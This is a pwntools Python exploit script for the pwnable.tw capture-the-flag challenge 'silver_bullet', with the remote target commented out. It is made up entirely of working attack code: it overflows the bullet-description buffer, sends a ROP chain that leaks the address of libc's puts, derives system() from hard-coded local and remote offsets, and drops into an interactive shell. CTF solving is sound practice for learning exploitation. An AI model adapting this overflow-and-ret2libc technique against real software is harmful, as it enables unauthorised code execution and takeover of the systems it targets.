from pwn import *
import struct

r = process("./silver_bullet")
#r = remote("chall.pwnable.tw", port=10103)
#r = process(["gdbserver", "localhost:1235", "./silver_bullet"])

def create_bullet(chars):
    r.recvuntil("choice :")
    r.sendline("1")
    r.recvuntil("bullet :")
    r.sendline(chars)

def describe_bullet(chars):
    r.recvuntil("choice :")
    r.sendline("2")
    r.recvuntil("bullet :")
    r.sendline(chars)

def beat_werewolf():
    r.recvuntil("choice :")
    r.sendline("3")

def leave():
    r.recvuntil("choice :")
    r.sendline("4")

HOME_PUTS_OFFSET = 0x00067360
REMOTE_PUTS_OFFSET = 0x0005f140

HOME_SYS_OFFSET = 0x0003cd10
REMOTE_SYS_OFFSET = 0x0003a940

binsh = 0xFFFFD258

rop = [0x080485EB, 0x08048475, 0x0804B004, 0x80484A8, 0x08048475, 0x0804AFDC, 0x8048643, 0x08048553, 0x0804B004]
payload = b"".join(addr.to_bytes(4, "little") for addr in rop)
payload = b"LLLDDDD" + payload

create_bullet("A")
describe_bullet("B" * 46)
describe_bullet("A")
describe_bullet(payload)
beat_werewolf()
beat_werewolf()
r.readuntil("You win !!\n")
r.sendline("sh")
line = r.readline()
addr = struct.unpack("<I", line[:-1])[0]

run_addr = addr - HOME_PUTS_OFFSET + HOME_SYS_OFFSET
#run_addr = addr - REMOTE_PUTS_OFFSET + REMOTE_SYS_OFFSET
int_run = struct.unpack("<i", struct.pack("<I", run_addr))[0]

r.sendline(str(int_run))
r.interactive()